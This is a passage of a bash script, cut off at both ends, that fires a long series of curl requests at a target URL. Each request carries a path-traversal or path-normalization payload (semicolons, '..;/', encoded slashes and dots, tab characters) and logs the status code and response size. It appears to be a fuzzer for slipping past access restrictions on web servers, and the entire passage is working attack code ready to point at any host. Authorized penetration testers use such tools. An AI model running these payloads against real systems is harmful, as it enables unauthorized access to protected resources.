code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/..;/;/" -H "$user_agent")
print
echo -n "Payload [ /x//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//../" -H "$user_agent")
print
echo -n "Payload [ /x//..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x//..;/" -H "$user_agent")
print
echo -n "Payload [ /x/;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/../" -H "$user_agent")
print
echo -n "Payload [ /x/;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/x/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;" -H "$user_agent")
print
echo -n "Payload [ ;%09 ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09" -H "$user_agent")
print
echo -n "Payload [ ;%09.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09.." -H "$user_agent")
print
echo -n "Payload [ ;%09..; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09..;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09..;" -H "$user_agent")
print
echo -n "Payload [ ;%09; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%09;" -H "$user_agent")
print
echo -n "Payload [ ;%2F.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2F.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2F.." -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f%2f/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2f/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f.." -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f%2e%2e%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f%2e%2e%2f%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f..%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f..%2f%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f..%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..%2f/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f../%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../%2f../" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f../// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///" -H "$user_agent")
print
echo -n "Payload [ ;%2f..///; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..///;" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..//;/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..//;/;" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;//" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f../;/;/; ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/;" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f../;/;/;" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;///" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;///" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;//;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;//;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;//;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f..;/;// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;/;//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f..;/;//" -H "$user_agent")
print
echo -n "Payload [ ;%2f/%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/%2f../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/%2f../" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..%2f" -H "$user_agent")
print
echo -n "Payload [ ;%2f//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f//..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f//..;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/../" -H "$user_agent")
print
echo -n "Payload [ ;%2f/;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ;%2f;//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;//../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;//../" -H "$user_agent")
print
echo -n "Payload [ ;%2f;/;/..;/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;/;/..;/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;%2f;/;/..;/" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e%2f/" -H "$user_agent")
print
echo -n "Payload [ ;/%2e%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ ;/%2e. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2e." -H "$user_agent")
print
echo -n "Payload [ ;/%2f%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f%2f../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/%2f/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/%2f/../" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e" -H "$user_agent")
print
echo -n "Payload [ ;/.%2e/%2e%2e/%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e/%2e%2e/%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.%2e/%2e%2e/%2f" -H "$user_agent")
print
echo -n "Payload [ ;/.. ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.." -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.." -H "$user_agent")
print
echo -n "Payload [ ;/..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f%2f../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f%2f../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f..%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f..%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f/" -H "$user_agent")
print
echo -n "Payload [ ;/..%2f// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..%2f//" -H "$user_agent")
print
echo -n "Payload [ ;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../" -H "$user_agent")
print
echo -n "Payload [ ;/../%2f/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../%2f/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../%2f/" -H "$user_agent")
print
echo -n "Payload [ ;/../../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../../" -H "$user_agent")
print
echo -n "Payload [ ;/../..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../..//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../..//" -H "$user_agent")
print
echo -n "Payload [ ;/.././../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.././../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/.././../" -H "$user_agent")
print
echo -n "Payload [ ;/../.;/../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../.;/../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/../.;/../" -H "$user_agent")
print
echo -n "Payload [ ;/..// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2e%2e/ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2e%2e/" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ ;/..//%2f ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2f" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//%2f" -H "$user_agent")
print
echo -n "Payload [ ;/..//../ ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//../" -H "$user_agent"
code=$(curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..//../" -H "$user_agent")
print
echo -n "Payload [ ;/../// ]:"
FILENAME=$(date +%s%N).html
echo curl --max-time 1 -H "$HEADER" --path-as-is -skg -o "$FILENAME" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL;/..///" -H "$user_agent"
